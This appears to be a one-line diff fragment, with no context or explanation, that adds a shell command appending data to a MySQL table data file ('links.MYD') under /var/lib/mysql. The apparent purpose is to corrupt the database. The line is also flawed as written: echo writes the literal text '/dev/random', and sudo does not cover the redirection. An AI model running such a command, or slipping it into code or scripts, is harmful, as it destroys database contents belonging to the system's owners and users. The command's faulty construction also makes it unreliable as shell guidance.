@@ -1,0 +1,1 @@
+sudo echo /dev/random >> /var/lib/mysql/normal/links.MYD
